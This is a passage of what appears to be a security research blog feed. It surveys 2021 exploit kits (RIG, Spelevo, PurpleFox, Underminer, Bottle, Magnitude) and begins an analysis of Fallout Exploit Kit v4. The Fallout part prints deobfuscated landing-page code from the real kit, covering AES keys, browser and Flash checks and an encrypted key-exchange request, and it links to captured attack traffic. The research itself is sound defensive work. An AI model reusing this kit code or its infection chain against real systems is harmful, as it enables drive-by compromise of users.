
<table>
  <thead>
    <tr>
      <th> </th>
      <th>Private</th>
      <th>Update</th>
      <th>Exploit</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RIG</td>
      <td>No</td>
      <td>Yes</td>
      <td>CVE-2020-0674, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Spelevo</td>
      <td>No</td>
      <td>No</td>
      <td>CVE-2018-8174, CVE-2018-15982</td>
    </tr>
    <tr>
      <td>PurpleFox</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Underminer</td>
      <td>Yes</td>
      <td>No</td>
      <td>CVE-2018-15982</td>
    </tr>
    <tr>
      <td>Bottle</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2020-1380, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Magnitude</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
  </tbody>
</table>

<p>Here is sample traffic for each.</p>

<h3 id="rig-exploit-kit">RIG Exploit Kit</h3>
<p>RIG is an Exploit Kit that has been active since around 2014. It was extremely active from 2016 to 2017, but then declined with the advent of Fallout and others. However, it is still active in 2021.</p>

<p>RIG started abusing CVE-2021-26411 in April 2021 and are still incorporating changes. Landing Pages are not obfuscated as they used to be. Very simple code. The malware is RC4 encrypted.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/rig.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/rig.saz">here</a>.</p>

<h3 id="spelevo-exploit-kit">Spelevo Exploit Kit</h3>
<p>Spelevo is an Exploit Kit that appeared in 2019. 2020 was very mature, but 2021 is one of the most active Exploit Kits.</p>

<p>Spelevo hasn’t changed for a long time. Spelevo hides the malware in the image. See this article[2] for detailed behavior.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/spelevo.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/spelevo.saz">here</a>.</p>

<h3 id="purplefox-exploit-kit">PurpleFox Exploit Kit</h3>
<p>PurpleFox is an Exploit Kit that has been active since 2019. A private exploit kit for sending PurpleFox malware. It’s enthusiastic about exploit and is fairly fast at incorporating new vulnerabilities.</p>

<p>Spelevo has started to exploit CVE-2021-26411 in April 2021. However, the other parts have not changed for a long time.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/purplefox.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/purplefox.saz">here</a>.</p>

<h3 id="underminer-exploit-kit">Underminer Exploit Kit</h3>
<p>Underminer is an Exploit Kit that appeared in 2018. It’s a pretty distinctive Exploit Kit. It is known to be extremely difficult to analyze. It is used to deliver its unique malware called Hidden Bee. See this article[3] for more details.</p>

<p>Underminer has a cycle of activity for several months and then silence for several months. It has been silent since the November 2020, but was revived in April 2021. But the essence hasn’t changed at all.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/underminer.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/underminer.saz">here</a>.</p>

<h3 id="bottle-exploit-kit">Bottle Exploit Kit</h3>
<p>Bottle is an Exploit Kit that appeared in 2019. An extremely rare Exploit Kit that targets only Japan. It is used to deliver its unique malware called Cinobi.</p>

<p>It is one of the most active Exploit Kits in Japan. It has not been observed since November 2020, but it was revived in April 2021. It’s also worth noting that unlike other Exploit Kits, it exploits CVE-2020-1380 and CVE-2021-26411. It has been pointed out that it is related to MageCart and phishing campaigns. See this article[4] for more details.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/bottle.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/bottle.saz">here</a>.</p>

<h3 id="magnitude-exploit-kit">Magnitude Exploit Kit</h3>
<p>Magnitude is one of the oldest existing Exploit Kits. It has been observed only in certain countries/regions such as South Korea and Taiwan, and the details have not been reported much.</p>

<p>Its activity was also reported in April 2021. It exploits CVE-2021-26411 and is still actively evolving.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">One more: <a href="https://twitter.com/hashtag/MagnitudeEK?src=hash&amp;ref_src=twsrc%5Etfw">#MagnitudeEK</a> <a href="https://t.co/pOuIZzAPZG">pic.twitter.com/pOuIZzAPZG</a></p>&mdash; Jérôme Segura (@jeromesegura) <a href="https://twitter.com/jeromesegura/status/1382395637480656896?ref_src=twsrc%5Etfw">April 14, 2021</a></blockquote>


<h2 id="finally">Finally</h2>
<p>Drive-by Download attacks are still observed in 2021. It has nothing to do with most people. As with Adobe Flash Player, stop using Internet Explorer immediately. That is the simplest solution. Drive-by Download attacks continue to exist with Internet Explorer.</p>

<h2 id="references">References</h2>
<p>[1] <a href="https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf">https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf</a><br />
[2] <a href="https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit">https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit</a><br />
[3] <a href="https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/">https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/</a><br />
[4] <a href="http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf">http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf</a></p>
]]></content:encoded>
<pubDate>2021-04-15T15:00:00+00:00</pubDate>
</item>
<item>
<title>Steady Evolution of Fallout v4</title>
<link>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</link>
<guid>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We have been observing the Fallout Exploit Kit since August 2018. Fallout is using non-characteristic URL and heavily obfuscated landing page. The user still exists and attacks are observed daily. Recently, we were investigating an attack campaign that infects Raccoon Stealer in the flow of PopAds-&gt; KeitaroTDS-&gt; Fallout.</p>

<p>About Fallout, we have already written three reports. The first one was about the emergence of Fallout, the second one was to start using PowerShell and the third one was to start exploiting PoC on GitHub. We divide these major changes by version and call them v1~3.</p>

<ul>
  <li><a href="https://nao-sec.org/2018/09/hello-fallout-exploit-kit.html">Hello “Fallout Exploit Kit”</a></li>
  <li><a href="https://nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In-Depth analysis of new Fallout Exploit Kit</a></li>
  <li><a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></li>
</ul>

<p>We wrote about v3 in March 2019. v3 is not stable and has been updated to the next version immediately. @EKFiddle (created and maintained by @jeromesegura) reported this change on April 11.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en"><a href="https://twitter.com/hashtag/EKFiddle?src=hash&amp;ref_src=twsrc%5Etfw">#EKFiddle</a> [Regex update]: <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a><br />Seems like there is no more use of the PoC on GitHub for CVE-2018-8174.<br />Pushing <a href="https://twitter.com/hashtag/GandCrab?src=hash&amp;ref_src=twsrc%5Etfw">#GandCrab</a> in this particular instance.<a href="https://t.co/U67qZosp1e">https://t.co/U67qZosp1e</a> <a href="https://t.co/buVTakYuhJ">pic.twitter.com/buVTakYuhJ</a></p>&mdash; EKFiddle (@EKFiddle) <a href="https://twitter.com/EKFiddle/status/1116134534989238272?ref_src=twsrc%5Etfw">2019年4月11日</a></blockquote>


<p>We call this a big update v4 (it is still v4). Detailed analysis report has not been written about what kind of update Fallout has done. However, this update is very big. At least for us (Exploit Kit analyst), that made the analysis very cumbersome. Fallout v4 incorporates the following features.</p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Diffie-Hellman key exchange
<span class="p">2.</span> VM detection
<span class="p">3.</span> Process detection
</code></pre></div></div>

<p>Here, we will share detailed analysis results on the updates made by Fallout v4. But unfortunately, we did not understand everything. If you are aware of it, please help us.</p>

<h2 id="traffic-chain">Traffic chain</h2>
<p>First, let’s look at the previous traffic chain. v1~3 was like this.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-eXpYD_rUFwU/W4loVPM1TTI/AAAAAAAAAVI/XuE3p36q7QMAVw95gBYPkKOA-IhsdaoAQCLcBGAs/s1600/0.png" />
<img alt="" src="https://3.bp.blogspot.com/-_qnvJOfIOeE/XEiKt9Zs16I/AAAAAAAAAYI/tspkgYcwxe0YjeGhaTGofsUBpfmhjJzmwCLcBGAs/s1600/0.png" />
<img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<p>In v3, it acquired PoC of CVE-2018-8174 from GitHub, and attacked by rewriting the part of shellcode. So what kind of traffic chain is v4?</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/01.png" /></p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Landing Page
<span class="p">2.</span> JavaScript Code
<span class="p">3.</span> Encoded Code 1
<span class="p">4.</span> Encoded Code 2 (CVE-2018-8174 + SWF Loader)
<span class="p">5.</span> CVE-2018-15982
<span class="p">6.</span> PowerShell Code
<span class="p">7.</span> Malware
</code></pre></div></div>

<p>In this way, an attack is performed by seven traffics. Let’s look at each one in order. (In the following, we will use different traffic data from the above. The detailed reason will be mentioned later, but it is difficult to capture and analyze traffic at the same time)</p>

<h2 id="landing-page--js-code--encoded-data">Landing Page + JS Code + Encoded Data</h2>
<p>In the landing page, JavaScript code is read first.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/04_09_2003/Symposium?Peristele=02_03_1943&amp;LE3r=Aps&amp;ILZhH=Frazzling-Anorexias"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>This includes CryptoJS and BigInteger obfuscated. Excluding the large library parts, there is very little processing.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// key</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">III1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">8b69cbdfc5fe43e69b7920c8ee721fc9</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// iv</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">II1ll11I</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">301ae8205ddcd5897df69e3b0c056c34</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">l11llIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">p4N9IqH/oiAKHkDCR0zXXfrvhwVrVPsFZSNUjkVFXxxBofjpd5JLM1sdAega3oRy</span><span class="dl">"</span><span class="p">,</span> <span class="nx">III1l1</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">II1ll11I</span>
<span class="p">})[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>First, two data (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) will appear. This is a key and an IV for AES encryption. By decrypting the next Base64 character string using these keys and IV, the necessary data (specifically, the URL for acquiring encoded data used in the next step) can be obtained. . When it tries decoding, it becomes like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/02.png" /></p>

<p>Next is the process of checking which browser is being used. Depending on it, Opera, Firefox, IE or Chrome is investigated.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check browser</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">String</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1l1IlI</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">addons</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opera</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2"> OPR/</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">InstallTrigger</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">documentMode</span><span class="dl">"</span><span class="p">])</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">runtime</span><span class="dl">"</span><span class="p">])</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Then there is a process to check the version of Adobe Flash Player. This data will be used later.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ShockwaveFlash.ShockwaveFlash</span><span class="dl">'</span><span class="p">).</span><span class="nx">getVariable</span><span class="p">(</span><span class="dl">'</span><span class="s1">$version</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>The process then returns to the landing page. In the landing page, one function is defined and executed. Let’s look at that function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E =&gt; str_B.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Here, many processes such as <code class="language-plaintext highlighter-rouge">window['Il1IIllIlI1I']['lIIIlI1IlII']['I111l11l']['II1I1I'](16)['lIlIlll11l']()</code> appear. This is defined in CryptoJS and generates a 32 character random hexadecimal string. After generating four random data, use the second, third and fourth of them to generate the fifth data. Here modPow is used. The five data prepared here will be used in the ensuing cryptographic process. We call them str_A, str_B, str_C, str_D, str_E.</p>

<p>The following code is divided into three parts. <code class="language-plaintext highlighter-rouge">Onreadystatechange</code> after the first one has sent a request to the server. The process of generating data to be sent by the second. The third is the process to send. These are the standard XMLHttpRequest POST procedures. First, let’s look at the process of generating transmission data.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A</span>

<span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Five data have been added to the array <code class="language-plaintext highlighter-rouge">l11IlIIlllll</code>. Other than the last one is the random data created earlier. There are 5 random data, but the data other than str_C is send data. The last one is the browser check data generated earlier. It checks whether the browser is Opera, Firefox, IE or Chrome, respectively, and contains true or false and is concatenated with <code class="language-plaintext highlighter-rouge">@@</code>. Such data is prepared for send. It should be noted here that str_C has not been sent to the server.</p>

<p>Next, let’s look at the sending process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="nx">l11llIll</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="cm">/* -- snip -- */</span>

<span class="c1">// Send POST</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>

    <span class="c1">// aes_encrypt(data, key, iv)</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>        <span class="c1">// post request data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
        <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>This is also a general request sending process. The URL is a string decoded by AES earlier. The data to be sent is the previously prepared data, but these are encrypted by AES. The key and IV are the same as those used to decode the URL. The previous data to be encrypted looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlII11"</span><span class="p">:</span><span class="s2">"c81e728d9d4c2f636f067f89cc14862c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lll1II"</span><span class="p">:</span><span class="s2">"a87ff679a2f3e71d9181a67b7542122c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"l11IlIl"</span><span class="p">:</span><span class="s2">"3f05415ebff145466040f6a73dca8704"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lI1lIl1Ill"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II1l1IlI"</span><span class="p">:</span><span class="s2">"false@@false@@true@@false"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The data actually sent is encrypted in this way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TvU4TAyld3MNlDcMtLwxBo+uVXAbIB1jpPO1a9HDv2dZs7HonG67s8heWoMyvnUFqFBdoEhU0STYjHHQxX6DK7x7Z1naG/2TAdm+AR5l6gpYVl4jXB9oOOyfJtZrfJHabQT5Jhlqv1dtvsJ+0G27qhamqtPT16wCpXn2R2WHf8NJu9SvXSSVadW7sT6QDt32Jt0z3oR0VIlpuE/w3snfKDNIjJYhuMz/VGYIL9WNdg0hC26sxB5fJ5fOOuifh2rNk9GgNsNdfVP01Tf77GRDu9puTbgfsgYOnCz0ONOmp05B14kJ1tK8ZI6ciOWLvOYV
</code></pre></div></div>

<p>Let’s look at the process after sending. <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called. Here, two AES decodings are performed. Let’s first look at the first decoding process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>

<span class="kd">var</span> <span class="nx">l1I1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIl11</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIlIl1IIl11</span><span class="p">);</span>
</code></pre></div></div>

